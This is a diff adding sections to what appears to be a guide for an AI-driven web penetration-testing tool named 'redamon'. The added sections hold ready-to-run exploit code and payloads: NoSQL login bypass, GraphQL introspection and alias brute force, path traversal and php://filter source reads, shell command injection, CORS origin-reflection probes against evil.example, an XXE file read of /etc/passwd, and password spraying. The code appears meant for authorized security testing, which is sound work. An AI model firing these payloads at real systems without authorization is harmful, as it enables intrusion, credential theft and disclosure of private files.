@@ -124,6 +124,13 @@ to a baseline. That fact is your oracle. Examples:
 - **decode** — encodings, opaque tokens, secrets in JS/bodies.
 - **sequencer** — token randomness/entropy analysis.
 - **flows** — multi-step chains: carry CSRF tokens / session state across steps.
+- **nosql** — MongoDB operator injection ($ne/$regex): auth bypass + blind extraction.
+- **graphql** — introspection, field-suggestion leak, alias amplification/brute.
+- **lfi** — local file inclusion / path traversal + php://filter source disclosure.
+- **cmdi** — OS command injection (in-band marker + time-based blind).
+- **cors** — CORS misconfig: origin reflection + null-origin trust.
+- **xxe** — XML external entity in-band file read.
+- **auth** — credential attacks: password spray/stuffing, session fixation.
 - **report** — turn a confirmed finding into evidence (finding + to_curl).
 
 ## recon — map the surface and pick your target
@@ -380,3 +387,126 @@ print(redamon.to_curl(txn_id))                                   # reproducible 
 ```
 A finding needs: the vuln class, the exact request (curl), the deciding evidence
 (status/length/extracted value or the leaked data), and severity. Print those, not raw bodies.
+
+## nosql — NoSQL (MongoDB) operator injection
+
+JSON APIs that build Mongo queries from the body are bypassable with operator objects
+like `{"$ne":null}` (always true). Send via `mutate.body` (JSON) or `mutate.param`
+(querystring apps use `username[$ne]=x`).
+```python
+import re
+t = redamon.search(path="/api/login", method="POST")[0]
+base = redamon.replay(t.id, {})                                   # normal (likely 401)
+# auth bypass: match ANY non-null user + pass
+r = redamon.replay(t.id, {"headers": {"Content-Type": "application/json"},
+                          "body": '{"username":{"$ne":null},"password":{"$ne":null}}'})
+if r.status in (200, 302) and r.status != base.status:
+    redamon.finding("nosql-auth-bypass", t.id, evidence=r, severity="critical")
+# blind extraction: {"password":{"$regex":"^a.*"}} — a status/length flip confirms the
+# prefix; loop the charset to pull the value out char by char (same idea as sqli bisection).
+```
+
+## graphql — GraphQL (introspection, field suggestion, aliases)
+
+Usually POST /graphql with a JSON `{"query":"..."}` body.
+```python
+import re
+g = redamon.search(path="/graphql", method="POST") or redamon.search(bodyq="query")
+t = g[0]
+ct = {"Content-Type": "application/json"}
+# 1) introspection — dump the whole schema (the attack-surface map)
+r = redamon.replay(t.id, {"headers": ct, "body": '{"query":"query{__schema{types{name fields{name}}}}"}'})
+if "__schema" in r.body:
+    redamon.finding("graphql-introspection", t.id, evidence=r, severity="medium")
+# 2) field suggestion — works even with introspection OFF: a wrong field leaks valid names
+r = redamon.replay(t.id, {"headers": ct, "body": '{"query":"query{userr{id}}"}'})
+print(re.findall(r'Did you mean[^"]+', r.body))
+# 3) alias amplification / brute — N aliases of one resolver in ONE request (one HTTP hit,
+#    dodges request-count limits): mutation{a0:login(...){token} a1:login(...){token} ...}
+import json
+aliases = " ".join(f'a{i}:login(user:"admin",pass:"p{i}"){{token}}' for i in range(50))
+r = redamon.replay(t.id, {"headers": ct, "body": json.dumps({"query": "mutation{%s}" % aliases})})
+```
+
+## lfi — local file inclusion / path traversal (in-band)
+
+A file/path/template param that returns file contents. Confirm by reading a known file;
+`php://filter` pulls PHP source (base64) without executing it.
+```python
+import re
+t = redamon.search()[0]                                          # a request with a file-ish param
+for pl in ["../../../../etc/passwd", "..%2f..%2f..%2f..%2fetc%2fpasswd",
+           "/etc/passwd", "....//....//etc/passwd"]:
+    r = redamon.replay(t.id, {"param": {"file": pl}})
+    if "root:x:0:0" in r.body:
+        redamon.finding("lfi", t.id, evidence=r, severity="high"); print("LFI:", pl); break
+# PHP source disclosure -> decode the base64 blob, it starts with <?php
+r = redamon.replay(t.id, {"param": {"file": "php://filter/convert.base64-encode/resource=index.php"}})
+m = re.search(r'[A-Za-z0-9+/]{40,}={0,2}', r.body)
+if m and redamon.decode(m.group(0)).lstrip().startswith("<?php"):
+    redamon.finding("lfi-source-disclosure", t.id, evidence=r, severity="high")
+```
+
+## cmdi — OS command injection (in-band + time-based)
+
+Inject a separator + command into a param the app hands to a shell.
+```python
+import time
+t = redamon.search()[0]
+mark = "rdmn7k"
+for sep in [f";echo {mark}", f"|echo {mark}", f"&&echo {mark}", f"$(echo {mark})", f"`echo {mark}`"]:
+    r = redamon.replay(t.id, {"param": {"host": "127.0.0.1" + sep}})
+    if mark in r.body:
+        redamon.finding("cmdi", t.id, evidence=r, severity="critical"); print("CMDI:", sep); break
+# blind: a sleep that delays the response confirms execution (OAST/DNS exfil unavailable)
+s = time.time(); redamon.replay(t.id, {"param": {"host": "127.0.0.1;sleep 5"}}); dt = time.time() - s
+if dt > 4.5: redamon.finding("cmdi-blind", t.id, severity="critical")
+```
+
+## cors — CORS misconfiguration (origin reflection)
+
+Send an attacker `Origin` and read the CORS response headers (lowercased).
+```python
+t = redamon.search(hasAuth=True)[0]
+r = redamon.replay(t.id, {"headers": {"Origin": "https://evil.example"}})
+acao = r.headers.get("access-control-allow-origin", "")
+acac = r.headers.get("access-control-allow-credentials", "")
+if acao == "https://evil.example" and acac.lower() == "true":
+    redamon.finding("cors-origin-reflection", t.id, evidence=r, severity="high")   # creds-readable cross-origin
+r = redamon.replay(t.id, {"headers": {"Origin": "null"}})                          # sandboxed-iframe/data: trick
+if r.headers.get("access-control-allow-origin") == "null":
+    redamon.finding("cors-null-origin", t.id, evidence=r, severity="medium")
+```
+
+## xxe — XML external entity (in-band file read)
+
+For endpoints that parse XML/SOAP bodies. In-band works when the parsed entity is
+reflected in the response; blind XXE needs OAST (unavailable) — report the sink instead.
+```python
+t = redamon.search(method="POST")[0]                            # an XML endpoint (Content-Type xml)
+xxe = ('<?xml version="1.0"?>'
+       '<!DOCTYPE r [<!ENTITY x SYSTEM "file:///etc/passwd">]>'
+       '<r>&x;</r>')                                            # wrap in whatever field the app echoes
+r = redamon.replay(t.id, {"headers": {"Content-Type": "application/xml"}, "body": xxe})
+if "root:x:0:0" in r.body:
+    redamon.finding("xxe-file-read", t.id, evidence=r, severity="critical")
+# Do NOT fire billion-laughs / DoS payloads at a live target.
+```
+
+## auth — credential attacks (spray, stuffing, fixation)
+
+```python
+t = redamon.search(path="/login", method="POST")[0]
+fail = redamon.replay(t.id, {}).status                          # baseline failed-login status
+# password spray: ONE password across many users (dodges per-account lockout)
+for u in ["admin", "root", "test", "user1"]:
+    r = redamon.replay(t.id, {"param": {"username": u, "password": "Winter2026!"}})  # mutate.body for JSON
+    if r.status in (200, 302) and r.status != fail:
+        redamon.finding("weak-credentials", t.id, evidence=r, severity="high"); print("HIT", u)
+# session fixation: does the session id CHANGE after login? if not -> fixation
+pre  = redamon.replay(t.id, {}).headers.get("set-cookie", "")
+post = redamon.replay(t.id, {"param": {"username": "valid", "password": "valid"}}).headers.get("set-cookie", "")
+if pre and post and pre.split(";")[0] == post.split(";")[0]:
+    redamon.finding("session-fixation", t.id, severity="medium")
+# credential stuffing = spray breached user:pass pairs (pitchfork over two lists).
+```
